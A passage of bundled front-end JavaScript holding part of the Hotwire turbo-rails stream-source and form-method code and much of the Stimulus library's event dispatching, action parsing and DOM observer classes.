        connected: this.subscriptionConnected.bind(this),
        disconnected: this.subscriptionDisconnected.bind(this)
      });
    }
    disconnectedCallback() {
      disconnectStreamSource(this);
      if (this.subscription)
        this.subscription.unsubscribe();
    }
    dispatchMessageEvent(data) {
      const event = new MessageEvent("message", { data });
      return this.dispatchEvent(event);
    }
    subscriptionConnected() {
      this.setAttribute("connected", "");
    }
    subscriptionDisconnected() {
      this.removeAttribute("connected");
    }
    get channel() {
      const channel = this.getAttribute("channel");
      const signed_stream_name = this.getAttribute("signed-stream-name");
      return { channel, signed_stream_name, ...walk({ ...this.dataset }) };
    }
  };
  if (customElements.get("turbo-cable-stream-source") === void 0) {
    customElements.define("turbo-cable-stream-source", TurboCableStreamSourceElement);
  }

  // node_modules/@hotwired/turbo-rails/app/javascript/turbo/fetch_requests.js
  function encodeMethodIntoRequestBody(event) {
    if (event.target instanceof HTMLFormElement) {
      const { target: form, detail: { fetchOptions } } = event;
      form.addEventListener("turbo:submit-start", ({ detail: { formSubmission: { submitter } } }) => {
        const body = isBodyInit(fetchOptions.body) ? fetchOptions.body : new URLSearchParams();
        const method = determineFetchMethod(submitter, body, form);
        if (!/get/i.test(method)) {
          if (/post/i.test(method)) {
            body.delete("_method");
          } else {
            body.set("_method", method);
          }
          fetchOptions.method = "post";
        }
      }, { once: true });
    }
  }
  function determineFetchMethod(submitter, body, form) {
    const formMethod = determineFormMethod(submitter);
    const overrideMethod = body.get("_method");
    const method = form.getAttribute("method") || "get";
    if (typeof formMethod == "string") {
      return formMethod;
    } else if (typeof overrideMethod == "string") {
      return overrideMethod;
    } else {
      return method;
    }
  }
  function determineFormMethod(submitter) {
    if (submitter instanceof HTMLButtonElement || submitter instanceof HTMLInputElement) {
      if (submitter.name === "_method") {
        return submitter.value;
      } else if (submitter.hasAttribute("formmethod")) {
        return submitter.formMethod;
      } else {
        return null;
      }
    } else {
      return null;
    }
  }
  function isBodyInit(body) {
    return body instanceof FormData || body instanceof URLSearchParams;
  }

  // node_modules/@hotwired/turbo-rails/app/javascript/turbo/index.js
  window.Turbo = turbo_es2017_esm_exports;
  addEventListener("turbo:before-fetch-request", encodeMethodIntoRequestBody);

  // node_modules/@hotwired/stimulus/dist/stimulus.js
  var EventListener = class {
    constructor(eventTarget, eventName, eventOptions) {
      this.eventTarget = eventTarget;
      this.eventName = eventName;
      this.eventOptions = eventOptions;
      this.unorderedBindings = /* @__PURE__ */ new Set();
    }
    connect() {
      this.eventTarget.addEventListener(this.eventName, this, this.eventOptions);
    }
    disconnect() {
      this.eventTarget.removeEventListener(this.eventName, this, this.eventOptions);
    }
    bindingConnected(binding) {
      this.unorderedBindings.add(binding);
    }
    bindingDisconnected(binding) {
      this.unorderedBindings.delete(binding);
    }
    handleEvent(event) {
      const extendedEvent = extendEvent(event);
      for (const binding of this.bindings) {
        if (extendedEvent.immediatePropagationStopped) {
          break;
        } else {
          binding.handleEvent(extendedEvent);
        }
      }
    }
    hasBindings() {
      return this.unorderedBindings.size > 0;
    }
    get bindings() {
      return Array.from(this.unorderedBindings).sort((left, right) => {
        const leftIndex = left.index, rightIndex = right.index;
        return leftIndex < rightIndex ? -1 : leftIndex > rightIndex ? 1 : 0;
      });
    }
  };
  function extendEvent(event) {
    if ("immediatePropagationStopped" in event) {
      return event;
    } else {
      const { stopImmediatePropagation } = event;
      return Object.assign(event, {
        immediatePropagationStopped: false,
        stopImmediatePropagation() {
          this.immediatePropagationStopped = true;
          stopImmediatePropagation.call(this);
        }
      });
    }
  }
  var Dispatcher = class {
    constructor(application2) {
      this.application = application2;
      this.eventListenerMaps = /* @__PURE__ */ new Map();
      this.started = false;
    }
    start() {
      if (!this.started) {
        this.started = true;
        this.eventListeners.forEach((eventListener) => eventListener.connect());
      }
    }
    stop() {
      if (this.started) {
        this.started = false;
        this.eventListeners.forEach((eventListener) => eventListener.disconnect());
      }
    }
    get eventListeners() {
      return Array.from(this.eventListenerMaps.values()).reduce((listeners, map) => listeners.concat(Array.from(map.values())), []);
    }
    bindingConnected(binding) {
      this.fetchEventListenerForBinding(binding).bindingConnected(binding);
    }
    bindingDisconnected(binding, clearEventListeners = false) {
      this.fetchEventListenerForBinding(binding).bindingDisconnected(binding);
      if (clearEventListeners)
        this.clearEventListenersForBinding(binding);
    }
    handleError(error2, message, detail = {}) {
      this.application.handleError(error2, `Error ${message}`, detail);
    }
    clearEventListenersForBinding(binding) {
      const eventListener = this.fetchEventListenerForBinding(binding);
      if (!eventListener.hasBindings()) {
        eventListener.disconnect();
        this.removeMappedEventListenerFor(binding);
      }
    }
    removeMappedEventListenerFor(binding) {
      const { eventTarget, eventName, eventOptions } = binding;
      const eventListenerMap = this.fetchEventListenerMapForEventTarget(eventTarget);
      const cacheKey = this.cacheKey(eventName, eventOptions);
      eventListenerMap.delete(cacheKey);
      if (eventListenerMap.size == 0)
        this.eventListenerMaps.delete(eventTarget);
    }
    fetchEventListenerForBinding(binding) {
      const { eventTarget, eventName, eventOptions } = binding;
      return this.fetchEventListener(eventTarget, eventName, eventOptions);
    }
    fetchEventListener(eventTarget, eventName, eventOptions) {
      const eventListenerMap = this.fetchEventListenerMapForEventTarget(eventTarget);
      const cacheKey = this.cacheKey(eventName, eventOptions);
      let eventListener = eventListenerMap.get(cacheKey);
      if (!eventListener) {
        eventListener = this.createEventListener(eventTarget, eventName, eventOptions);
        eventListenerMap.set(cacheKey, eventListener);
      }
      return eventListener;
    }
    createEventListener(eventTarget, eventName, eventOptions) {
      const eventListener = new EventListener(eventTarget, eventName, eventOptions);
      if (this.started) {
        eventListener.connect();
      }
      return eventListener;
    }
    fetchEventListenerMapForEventTarget(eventTarget) {
      let eventListenerMap = this.eventListenerMaps.get(eventTarget);
      if (!eventListenerMap) {
        eventListenerMap = /* @__PURE__ */ new Map();
        this.eventListenerMaps.set(eventTarget, eventListenerMap);
      }
      return eventListenerMap;
    }
    cacheKey(eventName, eventOptions) {
      const parts = [eventName];
      Object.keys(eventOptions).sort().forEach((key) => {
        parts.push(`${eventOptions[key] ? "" : "!"}${key}`);
      });
      return parts.join(":");
    }
  };
  var defaultActionDescriptorFilters = {
    stop({ event, value }) {
      if (value)
        event.stopPropagation();
      return true;
    },
    prevent({ event, value }) {
      if (value)
        event.preventDefault();
      return true;
    },
    self({ event, value, element }) {
      if (value) {
        return element === event.target;
      } else {
        return true;
      }
    }
  };
  var descriptorPattern = /^(?:(?:([^.]+?)\+)?(.+?)(?:\.(.+?))?(?:@(window|document))?->)?(.+?)(?:#([^:]+?))(?::(.+))?$/;
  function parseActionDescriptorString(descriptorString) {
    const source = descriptorString.trim();
    const matches = source.match(descriptorPattern) || [];
    let eventName = matches[2];
    let keyFilter = matches[3];
    if (keyFilter && !["keydown", "keyup", "keypress"].includes(eventName)) {
      eventName += `.${keyFilter}`;
      keyFilter = "";
    }
    return {
      eventTarget: parseEventTarget(matches[4]),
      eventName,
      eventOptions: matches[7] ? parseEventOptions(matches[7]) : {},
      identifier: matches[5],
      methodName: matches[6],
      keyFilter: matches[1] || keyFilter
    };
  }
  function parseEventTarget(eventTargetName) {
    if (eventTargetName == "window") {
      return window;
    } else if (eventTargetName == "document") {
      return document;
    }
  }
  function parseEventOptions(eventOptions) {
    return eventOptions.split(":").reduce((options, token) => Object.assign(options, { [token.replace(/^!/, "")]: !/^!/.test(token) }), {});
  }
  function stringifyEventTarget(eventTarget) {
    if (eventTarget == window) {
      return "window";
    } else if (eventTarget == document) {
      return "document";
    }
  }
  function camelize(value) {
    return value.replace(/(?:[_-])([a-z0-9])/g, (_, char) => char.toUpperCase());
  }
  function namespaceCamelize(value) {
    return camelize(value.replace(/--/g, "-").replace(/__/g, "_"));
  }
  function capitalize(value) {
    return value.charAt(0).toUpperCase() + value.slice(1);
  }
  function dasherize(value) {
    return value.replace(/([A-Z])/g, (_, char) => `-${char.toLowerCase()}`);
  }
  function tokenize(value) {
    return value.match(/[^\s]+/g) || [];
  }
  function isSomething(object) {
    return object !== null && object !== void 0;
  }
  function hasProperty(object, property) {
    return Object.prototype.hasOwnProperty.call(object, property);
  }
  var allModifiers = ["meta", "ctrl", "alt", "shift"];
  var Action = class {
    constructor(element, index, descriptor, schema) {
      this.element = element;
      this.index = index;
      this.eventTarget = descriptor.eventTarget || element;
      this.eventName = descriptor.eventName || getDefaultEventNameForElement(element) || error("missing event name");
      this.eventOptions = descriptor.eventOptions || {};
      this.identifier = descriptor.identifier || error("missing identifier");
      this.methodName = descriptor.methodName || error("missing method name");
      this.keyFilter = descriptor.keyFilter || "";
      this.schema = schema;
    }
    static forToken(token, schema) {
      return new this(token.element, token.index, parseActionDescriptorString(token.content), schema);
    }
    toString() {
      const eventFilter = this.keyFilter ? `.${this.keyFilter}` : "";
      const eventTarget = this.eventTargetName ? `@${this.eventTargetName}` : "";
      return `${this.eventName}${eventFilter}${eventTarget}->${this.identifier}#${this.methodName}`;
    }
    shouldIgnoreKeyboardEvent(event) {
      if (!this.keyFilter) {
        return false;
      }
      const filters = this.keyFilter.split("+");
      if (this.keyFilterDissatisfied(event, filters)) {
        return true;
      }
      const standardFilter = filters.filter((key) => !allModifiers.includes(key))[0];
      if (!standardFilter) {
        return false;
      }
      if (!hasProperty(this.keyMappings, standardFilter)) {
        error(`contains unknown key filter: ${this.keyFilter}`);
      }
      return this.keyMappings[standardFilter].toLowerCase() !== event.key.toLowerCase();
    }
    shouldIgnoreMouseEvent(event) {
      if (!this.keyFilter) {
        return false;
      }
      const filters = [this.keyFilter];
      if (this.keyFilterDissatisfied(event, filters)) {
        return true;
      }
      return false;
    }
    get params() {
      const params = {};
      const pattern = new RegExp(`^data-${this.identifier}-(.+)-param$`, "i");
      for (const { name, value } of Array.from(this.element.attributes)) {
        const match = name.match(pattern);
        const key = match && match[1];
        if (key) {
          params[camelize(key)] = typecast(value);
        }
      }
      return params;
    }
    get eventTargetName() {
      return stringifyEventTarget(this.eventTarget);
    }
    get keyMappings() {
      return this.schema.keyMappings;
    }
    keyFilterDissatisfied(event, filters) {
      const [meta, ctrl, alt, shift] = allModifiers.map((modifier) => filters.includes(modifier));
      return event.metaKey !== meta || event.ctrlKey !== ctrl || event.altKey !== alt || event.shiftKey !== shift;
    }
  };
  var defaultEventNames = {
    a: () => "click",
    button: () => "click",
    form: () => "submit",
    details: () => "toggle",
    input: (e) => e.getAttribute("type") == "submit" ? "click" : "input",
    select: () => "change",
    textarea: () => "input"
  };
  function getDefaultEventNameForElement(element) {
    const tagName = element.tagName.toLowerCase();
    if (tagName in defaultEventNames) {
      return defaultEventNames[tagName](element);
    }
  }
  function error(message) {
    throw new Error(message);
  }
  function typecast(value) {
    try {
      return JSON.parse(value);
    } catch (o_O) {
      return value;
    }
  }
  var Binding = class {
    constructor(context, action) {
      this.context = context;
      this.action = action;
    }
    get index() {
      return this.action.index;
    }
    get eventTarget() {
      return this.action.eventTarget;
    }
    get eventOptions() {
      return this.action.eventOptions;
    }
    get identifier() {
      return this.context.identifier;
    }
    handleEvent(event) {
      const actionEvent = this.prepareActionEvent(event);
      if (this.willBeInvokedByEvent(event) && this.applyEventModifiers(actionEvent)) {
        this.invokeWithEvent(actionEvent);
      }
    }
    get eventName() {
      return this.action.eventName;
    }
    get method() {
      const method = this.controller[this.methodName];
      if (typeof method == "function") {
        return method;
      }
      throw new Error(`Action "${this.action}" references undefined method "${this.methodName}"`);
    }
    applyEventModifiers(event) {
      const { element } = this.action;
      const { actionDescriptorFilters } = this.context.application;
      const { controller } = this.context;
      let passes = true;
      for (const [name, value] of Object.entries(this.eventOptions)) {
        if (name in actionDescriptorFilters) {
          const filter2 = actionDescriptorFilters[name];
          passes = passes && filter2({ name, value, event, element, controller });
        } else {
          continue;
        }
      }
      return passes;
    }
    prepareActionEvent(event) {
      return Object.assign(event, { params: this.action.params });
    }
    invokeWithEvent(event) {
      const { target, currentTarget } = event;
      try {
        this.method.call(this.controller, event);
        this.context.logDebugActivity(this.methodName, { event, target, currentTarget, action: this.methodName });
      } catch (error2) {
        const { identifier, controller, element, index } = this;
        const detail = { identifier, controller, element, index, event };
        this.context.handleError(error2, `invoking action "${this.action}"`, detail);
      }
    }
    willBeInvokedByEvent(event) {
      const eventTarget = event.target;
      if (event instanceof KeyboardEvent && this.action.shouldIgnoreKeyboardEvent(event)) {
        return false;
      }
      if (event instanceof MouseEvent && this.action.shouldIgnoreMouseEvent(event)) {
        return false;
      }
      if (this.element === eventTarget) {
        return true;
      } else if (eventTarget instanceof Element && this.element.contains(eventTarget)) {
        return this.scope.containsElement(eventTarget);
      } else {
        return this.scope.containsElement(this.action.element);
      }
    }
    get controller() {
      return this.context.controller;
    }
    get methodName() {
      return this.action.methodName;
    }
    get element() {
      return this.scope.element;
    }
    get scope() {
      return this.context.scope;
    }
  };
  var ElementObserver = class {
    constructor(element, delegate) {
      this.mutationObserverInit = { attributes: true, childList: true, subtree: true };
      this.element = element;
      this.started = false;
      this.delegate = delegate;
      this.elements = /* @__PURE__ */ new Set();
      this.mutationObserver = new MutationObserver((mutations) => this.processMutations(mutations));
    }
    start() {
      if (!this.started) {
        this.started = true;
        this.mutationObserver.observe(this.element, this.mutationObserverInit);
        this.refresh();
      }
    }
    pause(callback) {
      if (this.started) {
        this.mutationObserver.disconnect();
        this.started = false;
      }
      callback();
      if (!this.started) {
        this.mutationObserver.observe(this.element, this.mutationObserverInit);
        this.started = true;
      }
    }
    stop() {
      if (this.started) {
        this.mutationObserver.takeRecords();
        this.mutationObserver.disconnect();
        this.started = false;
      }
    }
    refresh() {
      if (this.started) {
        const matches = new Set(this.matchElementsInTree());
        for (const element of Array.from(this.elements)) {
          if (!matches.has(element)) {
            this.removeElement(element);
          }
        }
        for (const element of Array.from(matches)) {
          this.addElement(element);
        }
      }
    }
    processMutations(mutations) {
      if (this.started) {
        for (const mutation of mutations) {
          this.processMutation(mutation);
        }
      }
    }
    processMutation(mutation) {
      if (mutation.type == "attributes") {
        this.processAttributeChange(mutation.target, mutation.attributeName);
      } else if (mutation.type == "childList") {
        this.processRemovedNodes(mutation.removedNodes);
        this.processAddedNodes(mutation.addedNodes);
      }
    }
    processAttributeChange(element, attributeName) {
      if (this.elements.has(element)) {
        if (this.delegate.elementAttributeChanged && this.matchElement(element)) {
          this.delegate.elementAttributeChanged(element, attributeName);
        } else {
          this.removeElement(element);
        }
      } else if (this.matchElement(element)) {
        this.addElement(element);
      }
    }
    processRemovedNodes(nodes) {
      for (const node of Array.from(nodes)) {
        const element = this.elementFromNode(node);
        if (element) {
          this.processTree(element, this.removeElement);
        }
      }
    }
    processAddedNodes(nodes) {
      for (const node of Array.from(nodes)) {
        const element = this.elementFromNode(node);
        if (element && this.elementIsActive(element)) {
          this.processTree(element, this.addElement);
        }
      }
    }
    matchElement(element) {
      return this.delegate.matchElement(element);
    }
    matchElementsInTree(tree = this.element) {
      return this.delegate.matchElementsInTree(tree);
    }
    processTree(tree, processor) {
      for (const element of this.matchElementsInTree(tree)) {
        processor.call(this, element);
      }
    }
    elementFromNode(node) {
      if (node.nodeType == Node.ELEMENT_NODE) {
        return node;
      }
    }
    elementIsActive(element) {
      if (element.isConnected != this.element.isConnected) {
        return false;
      } else {
        return this.element.contains(element);
      }
    }
    addElement(element) {
      if (!this.elements.has(element)) {
        if (this.elementIsActive(element)) {
          this.elements.add(element);
          if (this.delegate.elementMatched) {
            this.delegate.elementMatched(element);
          }
        }
      }
    }
    removeElement(element) {
      if (this.elements.has(element)) {
        this.elements.delete(element);
        if (this.delegate.elementUnmatched) {
          this.delegate.elementUnmatched(element);
        }
      }
    }
  };
  var AttributeObserver = class {
    constructor(element, attributeName, delegate) {
      this.attributeName = attributeName;
      this.delegate = delegate;
      this.elementObserver = new ElementObserver(element, this);
    }
    get element() {
      return this.elementObserver.element;
    }
    get selector() {
      return `[${this.attributeName}]`;
    }
    start() {
      this.elementObserver.start();
    }
    pause(callback) {
      this.elementObserver.pause(callback);
    }
    stop() {
      this.elementObserver.stop();
    }
    refresh() {
      this.elementObserver.refresh();
    }
    get started() {
      return this.elementObserver.started;
    }
    matchElement(element) {
      return element.hasAttribute(this.attributeName);
    }
    matchElementsInTree(tree) {
      const match = this.matchElement(tree) ? [tree] : [];
      const matches = Array.from(tree.querySelectorAll(this.selector));
      return match.concat(matches);
    }
    elementMatched(element) {
      if (this.delegate.elementMatchedAttribute) {
        this.delegate.elementMatchedAttribute(element, this.attributeName);
      }
    }
    elementUnmatched(element) {
      if (this.delegate.elementUnmatchedAttribute) {
        this.delegate.elementUnmatchedAttribute(element, this.attributeName);
      }
    }
    elementAttributeChanged(element, attributeName) {
      if (this.delegate.elementAttributeValueChanged && this.attributeName == attributeName) {
        this.delegate.elementAttributeValueChanged(element, attributeName);
      }
    }
  };
  function add(map, key, value) {
    fetch(map, key).add(value);
  }
  function del(map, key, value) {
    fetch(map, key).delete(value);
    prune(map, key);
  }
  function fetch(map, key) {
    let values = map.get(key);
    if (!values) {
      values = /* @__PURE__ */ new Set();
      map.set(key, values);
    }
    return values;
  }
  function prune(map, key) {
    const values = map.get(key);
    if (values != null && values.size == 0) {
      map.delete(key);
    }
  }
  var Multimap = class {
    constructor() {
      this.valuesByKey = /* @__PURE__ */ new Map();
    }
    get keys() {
      return Array.from(this.valuesByKey.keys());
    }
    get values() {
      const sets = Array.from(this.valuesByKey.values());
      return sets.reduce((values, set) => values.concat(Array.from(set)), []);
    }
    get size() {
      const sets = Array.from(this.valuesByKey.values());
      return sets.reduce((size, set) => size + set.size, 0);
    }
    add(key, value) {
      add(this.valuesByKey, key, value);
    }
    delete(key, value) {
      del(this.valuesByKey, key, value);
    }
    has(key, value) {
      const values = this.valuesByKey.get(key);
      return values != null && values.has(value);
    }
    hasKey(key) {
      return this.valuesByKey.has(key);
    }
    hasValue(value) {
      const sets = Array.from(this.valuesByKey.values());
      return sets.some((set) => set.has(value));
    }
    getValuesForKey(key) {
      const values = this.valuesByKey.get(key);
      return values ? Array.from(values) : [];
    }
    getKeysForValue(value) {
      return Array.from(this.valuesByKey).filter(([_key, values]) => values.has(value)).map(([key, _values]) => key);
    }
  };
  var SelectorObserver = class {
    constructor(element, selector, delegate, details) {
      this._selector = selector;
      this.details = details;
      this.elementObserver = new ElementObserver(element, this);
      this.delegate = delegate;
      this.matchesByElement = new Multimap();
    }
    get started() {
      return this.elementObserver.started;
    }
    get selector() {
      return this._selector;
    }
    set selector(selector) {
      this._selector = selector;
      this.refresh();
    }
    start() {
      this.elementObserver.start();
    }
    pause(callback) {
      this.elementObserver.pause(callback);
    }
    stop() {
      this.elementObserver.stop();
    }
    refresh() {
      this.elementObserver.refresh();
    }
    get element() {
      return this.elementObserver.element;
    }
    matchElement(element) {
      const { selector } = this;
      if (selector) {
        const matches = element.matches(selector);
        if (this.delegate.selectorMatchElement) {
          return matches && this.delegate.selectorMatchElement(element, this.details);
        }
        return matches;
      } else {
        return false;
      }
    }
    matchElementsInTree(tree) {
      const { selector } = this;
      if (selector) {
        const match = this.matchElement(tree) ? [tree] : [];
        const matches = Array.from(tree.querySelectorAll(selector)).filter((match2) => this.matchElement(match2));
        return match.concat(matches);
      } else {
        return [];
      }
    }
    elementMatched(element) {
      const { selector } = this;
      if (selector) {
        this.selectorMatched(element, selector);
      }
    }
    elementUnmatched(element) {
      const selectors = this.matchesByElement.getKeysForValue(element);
      for (const selector of selectors) {
        this.selectorUnmatched(element, selector);
      }
    }
    elementAttributeChanged(element, _attributeName) {
      const { selector } = this;
      if (selector) {
        const matches = this.matchElement(element);
        const matchedBefore = this.matchesByElement.has(selector, element);
        if (matches && !matchedBefore) {
          this.selectorMatched(element, selector);
        } else if (!matches && matchedBefore) {
          this.selectorUnmatched(element, selector);
        }
      }
    }
    selectorMatched(element, selector) {
      this.delegate.selectorMatched(element, selector, this.details);
      this.matchesByElement.add(selector, element);
    }
    selectorUnmatched(element, selector) {
      this.delegate.selectorUnmatched(element, selector, this.details);
      this.matchesByElement.delete(selector, element);
    }
  };
  var StringMapObserver = class {
    constructor(element, delegate) {
      this.element = element;
      this.delegate = delegate;
      this.started = false;
      this.stringMap = /* @__PURE__ */ new Map();
      this.mutationObserver = new MutationObserver((mutations) => this.processMutations(mutations));
    }
    start() {
      if (!this.started) {
        this.started = true;
        this.mutationObserver.observe(this.element, { attributes: true, attributeOldValue: true });
        this.refresh();
      }
    }
    stop() {
      if (this.started) {
        this.mutationObserver.takeRecords();
        this.mutationObserver.disconnect();
        this.started = false;
      }
    }
    refresh() {
      if (this.started) {
        for (const attributeName of this.knownAttributeNames) {
          this.refreshAttribute(attributeName, null);
        }
      }
    }
    processMutations(mutations) {
      if (this.started) {
        for (const mutation of mutations) {
          this.processMutation(mutation);
        }
      }
    }
    processMutation(mutation) {
      const attributeName = mutation.attributeName;
      if (attributeName) {
        this.refreshAttribute(attributeName, mutation.oldValue);
      }
    }
    refreshAttribute(attributeName, oldValue) {
      const key = this.delegate.getStringMapKeyForAttribute(attributeName);
      if (key != null) {
        if (!this.stringMap.has(attributeName)) {
          this.stringMapKeyAdded(key, attributeName);
        }
        const value = this.element.getAttribute(attributeName);
        if (this.stringMap.get(attributeName) != value) {
          this.stringMapValueChanged(value, key, oldValue);
        }
        if (value == null) {
          const oldValue2 = this.stringMap.get(attributeName);
          this.stringMap.delete(attributeName);
          if (oldValue2)
            this.stringMapKeyRemoved(key, attributeName, oldValue2);
        } else {
          this.stringMap.set(attributeName, value);
        }
      }
    }
    stringMapKeyAdded(key, attributeName) {
      if (this.delegate.stringMapKeyAdded) {
        this.delegate.stringMapKeyAdded(key, attributeName);
      }
    }
    stringMapValueChanged(value, key, oldValue) {
      if (this.delegate.stringMapValueChanged) {
        this.delegate.stringMapValueChanged(value, key, oldValue);
      }
    }
    stringMapKeyRemoved(key, attributeName, oldValue) {
      if (this.delegate.stringMapKeyRemoved) {
        this.delegate.stringMapKeyRemoved(key, attributeName, oldValue);
      }
    }
    get knownAttributeNames() {
      return Array.from(new Set(this.currentAttributeNames.concat(this.recordedAttributeNames)));
    }
    get currentAttributeNames() {
      return Array.from(this.element.attributes).map((attribute) => attribute.name);
    }
    get recordedAttributeNames() {
      return Array.from(this.stringMap.keys());
    }
  };
  var TokenListObserver = class {
    constructor(element, attributeName, delegate) {
      this.attributeObserver = new AttributeObserver(element, attributeName, this);
      this.delegate = delegate;
      this.tokensByElement = new Multimap();
    }
    get started() {
      return this.attributeObserver.started;
    }
    start() {
      this.attributeObserver.start();
    }
    pause(callback) {
      this.attributeObserver.pause(callback);
    }
    stop() {
      this.attributeObserver.stop();
    }
    refresh() {
      this.attributeObserver.refresh();
    }
    get element() {
      return this.attributeObserver.element;
    }
    get attributeName() {
      return this.attributeObserver.attributeName;
    }
    elementMatchedAttribute(element) {
      this.tokensMatched(this.readTokensForElement(element));
    }
    elementAttributeValueChanged(element) {
      const [unmatchedTokens, matchedTokens] = this.refreshTokensForElement(element);
      this.tokensUnmatched(unmatchedTokens);
      this.tokensMatched(matchedTokens);
    }
    elementUnmatchedAttribute(element) {
      this.tokensUnmatched(this.tokensByElement.getValuesForKey(element));
    }
    tokensMatched(tokens) {
      tokens.forEach((token) => this.tokenMatched(token));
    }
    tokensUnmatched(tokens) {
      tokens.forEach((token) => this.tokenUnmatched(token));
    }
    tokenMatched(token) {
      this.delegate.tokenMatched(token);
      this.tokensByElement.add(token.element, token);
    }
    tokenUnmatched(token) {
      this.delegate.tokenUnmatched(token);
      this.tokensByElement.delete(token.element, token);
    }
    refreshTokensForElement(element) {
      const previousTokens = this.tokensByElement.getValuesForKey(element);
      const currentTokens = this.readTokensForElement(element);
      const firstDifferingIndex = zip(previousTokens, currentTokens).findIndex(([previousToken, currentToken]) => !tokensAreEqual(previousToken, currentToken));
      if (firstDifferingIndex == -1) {
        return [[], []];
      } else {
        return [previousTokens.slice(firstDifferingIndex), currentTokens.slice(firstDifferingIndex)];
      }
    }
    readTokensForElement(element) {
      const attributeName = this.attributeName;
      const tokenString = element.getAttribute(attributeName) || "";
      return parseTokenString(tokenString, element, attributeName);
    }
  };
  function parseTokenString(tokenString, element, attributeName) {
    return tokenString.trim().split(/\s+/).filter((content) => content.length).map((content, index) => ({ element, attributeName, content, index }));
  }
  function zip(left, right) {
    const length = Math.max(left.length, right.length);
    return Array.from({ length }, (_, index) => [left[index], right[index]]);
  }
  function tokensAreEqual(left, right) {
    return left && right && left.index == right.index && left.content == right.content;
  }
  var ValueListObserver = class {
    constructor(element, attributeName, delegate) {
      this.tokenListObserver = new TokenListObserver(element, attributeName, this);
      this.delegate = delegate;
      this.parseResultsByToken = /* @__PURE__ */ new WeakMap();
      this.valuesByTokenByElement = /* @__PURE__ */ new WeakMap();
    }
    get started() {
      return this.tokenListObserver.started;
    }
    start() {
      this.tokenListObserver.start();
    }
    stop() {
      this.tokenListObserver.stop();
    }
    refresh() {
      this.tokenListObserver.refresh();
    }
    get element() {
      return this.tokenListObserver.element;
    }
    get attributeName() {
      return this.tokenListObserver.attributeName;
    }
    tokenMatched(token) {
      const { element } = token;
      const { value } = this.fetchParseResultForToken(token);
      if (value) {
        this.fetchValuesByTokenForElement(element).set(token, value);
        this.delegate.elementMatchedValue(element, value);
      }
    }
    tokenUnmatched(token) {
      const { element } = token;
      const { value } = this.fetchParseResultForToken(token);
      if (value) {
        this.fetchValuesByTokenForElement(element).delete(token);
        this.delegate.elementUnmatchedValue(element, value);
      }
    }
    fetchParseResultForToken(token) {
      let parseResult = this.parseResultsByToken.get(token);
      if (!parseResult) {
        parseResult = this.parseToken(token);
        this.parseResultsByToken.set(token, parseResult);
      }
      return parseResult;
    }
    fetchValuesByTokenForElement(element) {
      let valuesByToken = this.valuesByTokenByElement.get(element);
      if (!valuesByToken) {
        valuesByToken = /* @__PURE__ */ new Map();
        this.valuesByTokenByElement.set(element, valuesByToken);
      }
      return valuesByToken;
    }
    parseToken(token) {
      try {
        const value = this.delegate.parseValueForToken(token);
        return { value };
      } catch (error2) {
        return { error: error2 };
      }
    }
  };
  var BindingObserver = class {
    constructor(context, delegate) {
      this.context = context;
      this.delegate = delegate;
      this.bindingsByAction = /* @__PURE__ */ new Map();
    }
    start() {
      if (!this.valueListObserver) {
        this.valueListObserver = new ValueListObserver(this.element, this.actionAttribute, this);
        this.valueListObserver.start();
      }
    }
    stop() {
      if (this.valueListObserver) {
        this.valueListObserver.stop();
        delete this.valueListObserver;
        this.disconnectAllActions();
      }
    }
    get element() {
      return this.context.element;
    }
    get identifier() {
      return this.context.identifier;
    }
    get actionAttribute() {
      return this.schema.actionAttribute;
    }
    get schema() {
      return this.context.schema;
    }
    get bindings() {
      return Array.from(this.bindingsByAction.values());
    }
    connectAction(action) {
      const binding = new Binding(this.context, action);
      this.bindingsByAction.set(action, binding);
      this.delegate.bindingConnected(binding);
    }
    disconnectAction(action) {
      const binding = this.bindingsByAction.get(action);
      if (binding) {
        this.bindingsByAction.delete(action);
        this.delegate.bindingDisconnected(binding);
      }
    }
    disconnectAllActions() {
      this.bindings.forEach((binding) => this.delegate.bindingDisconnected(binding, true));
      this.bindingsByAction.clear();
    }
    parseValueForToken(token) {
      const action = Action.forToken(token, this.schema);
      if (action.identifier == this.identifier) {
        return action;
      }
    }
    elementMatchedValue(element, action) {
      this.connectAction(action);
    }
    elementUnmatchedValue(element, action) {
      this.disconnectAction(action);
    }
  };
  var ValueObserver = class {
    constructor(context, receiver) {
      this.context = context;
      this.receiver = receiver;
      this.stringMapObserver = new StringMapObserver(this.element, this);
      this.valueDescriptorMap = this.controller.valueDescriptorMap;
    }
    start() {
      this.stringMapObserver.start();
      this.invokeChangedCallbacksForDefaultValues();
    }
    stop() {
      this.stringMapObserver.stop();
    }
    get element() {
      return this.context.element;
    }
    get controller() {
      return this.context.controller;
    }
    getStringMapKeyForAttribute(attributeName) {
      if (attributeName in this.valueDescriptorMap) {
        return this.valueDescriptorMap[attributeName].name;
      }
    }
    stringMapKeyAdded(key, attributeName) {
      const descriptor = this.valueDescriptorMap[attributeName];
      if (!this.hasValue(key)) {
        this.invokeChangedCallback(key, descriptor.writer(this.receiver[key]), descriptor.writer(descriptor.defaultValue));
      }
    }
    stringMapValueChanged(value, name, oldValue) {
      const descriptor = this.valueDescriptorNameMap[name];
      if (value === null)
        return;
      if (oldValue === null) {
        oldValue = descriptor.writer(descriptor.defaultValue);
      }
      this.invokeChangedCallback(name, value, oldValue);
    }
    stringMapKeyRemoved(key, attributeName, oldValue) {
      const descriptor = this.valueDescriptorNameMap[key];
      if (this.hasValue(key)) {
        this.invokeChangedCallback(key, descriptor.writer(this.receiver[key]), oldValue);
      } else {
        this.invokeChangedCallback(key, descriptor.writer(descriptor.defaultValue), oldValue);
      }
    }
    invokeChangedCallbacksForDefaultValues() {
      for (const { key, name, defaultValue, writer } of this.valueDescriptors) {
        if (defaultValue != void 0 && !this.controller.data.has(key)) {
          this.invokeChangedCallback(name, writer(defaultValue), void 0);
        }
      }
    }
    invokeChangedCallback(name, rawValue, rawOldValue) {
      const changedMethodName = `${name}Changed`;
      const changedMethod = this.receiver[changedMethodName];
      if (typeof changedMethod == "function") {
        const descriptor = this.valueDescriptorNameMap[name];
        try {
          const value = descriptor.reader(rawValue);
          let oldValue = rawOldValue;
          if (rawOldValue) {
            oldValue = descriptor.reader(rawOldValue);
          }
          changedMethod.call(this.receiver, value, oldValue);
        } catch (error2) {
          if (error2 instanceof TypeError) {
            error2.message = `Stimulus Value "${this.context.identifier}.${descriptor.name}" - ${error2.message}`;
          }
          throw error2;
        }
      }
    }
    get valueDescriptors() {
      const { valueDescriptorMap } = this;
      return Object.keys(valueDescriptorMap).map((key) => valueDescriptorMap[key]);
    }
    get valueDescriptorNameMap() {
      const descriptors2 = {};
